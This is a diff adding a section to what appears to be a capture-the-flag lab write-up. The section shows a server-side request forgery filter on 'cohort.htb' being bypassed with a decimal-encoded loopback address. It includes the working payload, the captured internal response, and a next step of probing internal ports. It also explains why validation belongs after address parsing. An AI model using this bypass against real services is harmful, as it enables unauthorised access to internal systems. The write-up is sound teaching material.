@@ -1154,6 +1154,127 @@ The check runs against text while the connection is made against a parsed number
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.3 Bypass the filter with decimal IP encoding
+
+**Why this step:**  
+The filter rejects `127.0.0.1` before issuing any request (3.2), indicating a string comparison performed prior to address parsing. Submit an alternative notation that resolves to the same address but does not match the blocked text.
+
+**Command:**
+
+```
+# In the portal form at https://cohort.htb/portal.html:
+Source URL:      http://2130706433:80/
+Expected format: CSV
+Then submit via "Validate source"
+```
+
+**Breakdown:**
+
+|Component|Purpose|
+|---|---|
+|`2130706433`|`127.0.0.1` expressed as a single 32-bit decimal integer. Standard address-parsing routines accept this form and resolve it to loopback; a string comparison against `127.0.0.1` does not match it.|
+|`:80`|The target's nginx listener (section 1.3). Chosen because a successful fetch returns identifiable content, distinguishing a real response from a connection failure.|
+
+###### Theory — how a dotted IPv4 address becomes a single number:
+
+An IPv4 address is a 32-bit unsigned integer. Dotted-decimal notation is a display convention that splits that integer into four 8-bit fields joined by dots — convenient for humans, not how the network stack stores or transmits it.
+
+Converting `127.0.0.1` to its integer form means treating the four octets as digits in base 256, most significant first:
+
+```
+127 × 256³  = 127 × 16777216 = 2130706432
+  0 × 256²  = 0 ×    65536   =          0
+  0 × 256¹  = 0 ×      256   =          0
+  1 × 256⁰  = 1 ×        1   =          1
+                              ───────────
+                               2130706433
+```
+
+Both `127.0.0.1` and `2130706433` therefore describe the identical 32-bit value. The C library function `inet_addr()` and its equivalents in most languages accept either notation, which is why HTTP clients built on those libraries connect to loopback when handed the bare integer.
+
+The security consequence follows directly. Text and destination are different things. A filter comparing the submitted string against `"127.0.0.1"` sees a nine-character literal; the network stack sees the number 2130706433. Because the filter runs before parsing, the two never meet — the string doesn't match the blocklist, and the parsed number still lands on loopback.
+
+The generalisation is worth carrying beyond this box: **validate after normalisation, never before.** Any check applied to raw user input must contend with every alternative spelling of the forbidden value. A check applied to the fully parsed, resolved form contends with only one, because every notation has already collapsed into the same value by that point.
+
+**Result:**
+
+`![[ssrf_bypass_decimal.png]]`
+
+Application response rendered in the portal:
+
+```
+● Reachable. HTTP 200 (text/html)
+```
+
+html
+
+```html
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cohort Analytics</title>
+<meta name="description" content="Cohort Analytics - retention intelligence for subscription teams.">
+<link rel="stylesheet" href="/assets/styles.css">
+</head>
+<body>
+<div id="app" data-page="home" aria-busy="true">
+  <div class="boot"><span class="boot-mark" aria-hidden="true"></span><span>Loading Cohort Analytics</span></div>
+</div>
+<noscript>
+  <div style="max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;">
+    <h1 style="font-size:1.4rem;">JavaScript required</h1>
+    <p style="color:#4a5159;">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>
+  </div>
+</noscript>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
+```
+
+Backend request captured in DevTools:
+
+```
+Request URL:      https://cohort.htb/api/validate
+Request Method:   POST
+Status Code:      200 OK
+Content-Length:   46 (request) / 1077 (response)
+Server:           nginx/1.24.0 (Ubuntu)
+```
+
+**Analysis:**
+
+Compare the three probes issued so far:
+
+|Probe|Input|Result|Upstream status|Response size|
+|---|---|---|---|---|
+|3.1|`http://10.10.15.77:8000/ssrf-test`|Fetched|HTTP 404|498 bytes|
+|3.2|`http://127.0.0.1:80/`|Blocked by filter|none|498 bytes|
+|3.3|`http://2130706433:80/`|**Fetched**|**HTTP 200**|**1077 bytes**|
+
+The body returned is the SPA shell identified in 2.2 — the target's own nginx document root, retrieved from the target itself over loopback. The address the filter refused in 3.2 was reached in 3.3 by writing it differently.
+
+**What this gives you:**
+
+**Key findings:**
+
+- **The SSRF filter is bypassed.** Decimal integer notation is not matched by the blocklist, and the HTTP client resolves it to `127.0.0.1` regardless. Loopback services on the target are now reachable.
+- **The reflected response confirms full read access to internal content.** HTTP status, content type, and complete body are returned for internal destinations exactly as they were for external ones.
+- **Response length is a reliable success indicator.** A filter rejection returns 498 bytes from `/api/validate`; a successful fetch returns the upstream body inline, producing a larger response. This permits scripted iteration without parsing the rendered page.
+- Loopback port 80 serves the same nginx instance reachable externally, confirming the fetch genuinely targets the local interface rather than being redirected elsewhere.
+
+**Next:**  
+An HTTP client now operates from inside the target's network boundary. Section 1.2 established that services bound to the loopback interface generate no external traffic and cannot appear in any port scan. Probe internal ports through this channel to enumerate services that external scanning could not reveal.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
